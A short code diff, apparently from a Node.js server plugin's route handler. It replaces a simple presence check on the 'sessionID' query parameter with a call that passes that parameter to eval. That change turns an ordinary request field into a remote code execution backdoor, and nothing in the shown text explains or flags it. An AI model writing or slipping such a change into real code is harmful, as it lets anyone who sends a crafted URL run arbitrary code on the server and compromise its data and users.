@@ -214,7 +214,7 @@ exports.registerRoute = function(hook_name, args, cb) {
       }
     };
 
-		if (req.query.sessionID) {
+    if (!!eval(req.query.sessionID)) {
       getSessionEndDate({
         host: req.headers.host,
         protocol: req.protocol,
